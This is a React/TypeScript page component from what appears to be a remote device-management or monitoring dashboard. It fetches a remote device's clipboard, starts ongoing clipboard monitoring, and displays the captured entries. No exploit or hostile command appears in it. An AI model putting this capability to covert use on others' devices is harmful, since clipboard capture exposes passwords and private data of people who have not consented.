import { useCallback } from 'react';
import { useOutletContext } from 'react-router-dom';
import { useDeviceData } from '@/hooks/useDeviceData';
import type { DeviceOutletContext, ClipboardEntry } from '@/types';
import { CMD, normalizeClipboardList, extractList } from '@/types';
import { DevicePageHeader, EmptyState, ErrorAlert, LoadingSkeleton } from '@/components/device/shared';
import { Card, CardContent } from '@/components/ui/card';
import { Clipboard as ClipboardIcon, Eye } from 'lucide-react';
import { Badge } from '@/components/ui/badge';

export default function ClipboardPage() {
  const { clientId, online } = useOutletContext<DeviceOutletContext>();

  const { data: clipboard, loading, error, refresh, sendCommand, commandStatus } = useDeviceData<ClipboardEntry[]>({
    clientId,
    page: 'clipboard',
    extractData: (d) => normalizeClipboardList(extractList(d.list)),
    dataType: 'clipboard',
    defaultValue: [],
  });

  const fetchClipboard = useCallback(async () => {
    await sendCommand(CMD.CLIPBOARD, { action: 'fetch' });
  }, [sendCommand]);

  const monitorClipboard = useCallback(async () => {
    await sendCommand(CMD.CLIPBOARD, { action: 'start' });
  }, [sendCommand]);

  return (
    <div className="space-y-5">
      <DevicePageHeader
        title="Clipboard"
        subtitle={`${clipboard.length} entries`}
        actions={[
          { label: 'Fetch', icon: ClipboardIcon, onClick: fetchClipboard, disabled: loading || !online },
          { label: 'Monitor', icon: Eye, onClick: monitorClipboard, disabled: loading || !online, variant: 'outline' },
        ]}
        refresh={refresh}
        loading={loading}
        commandStatus={commandStatus}
      />

      {error && <ErrorAlert message={error} onRetry={refresh} />}

      {loading && !error ? (
        <LoadingSkeleton rows={4} />
      ) : clipboard.length === 0 ? (
        <EmptyState
          icon={ClipboardIcon}
          title="No clipboard data"
          description="Click Fetch to retrieve clipboard content"
          action={{ label: 'Fetch Clipboard', onClick: fetchClipboard, disabled: loading || !online, loading: commandStatus === 'sending' }}
        />
      ) : (
        <div className="space-y-2">
          {clipboard.map((item, i) => (
            <Card key={`clip-${item.timestamp}-${i}`} className="shadow-none">
              <CardContent className="p-3">
                <p className="font-mono text-xs break-all bg-muted/50 rounded p-2">{item.text || '-'}</p>
                <div className="flex items-center gap-2 mt-1.5 text-[10px] text-muted-foreground flex-wrap">
                  <span>{item.length} chars</span>
                  <span>·</span>
                  <span>{item.timestamp}</span>
                  {item.label && (
                    <>
                      <span>·</span>
                      <Badge variant="secondary" className="text-[9px] px-1 py-0">{item.label}</Badge>
                    </>
                  )}
                  {item.mimeType && (
                    <>
                      <span>·</span>
                      <Badge variant="outline" className="text-[9px] px-1 py-0">{item.mimeType}</Badge>
                    </>
                  )}
                </div>
              </CardContent>
            </Card>
          ))}
        </div>
      )}
    </div>
  );
}
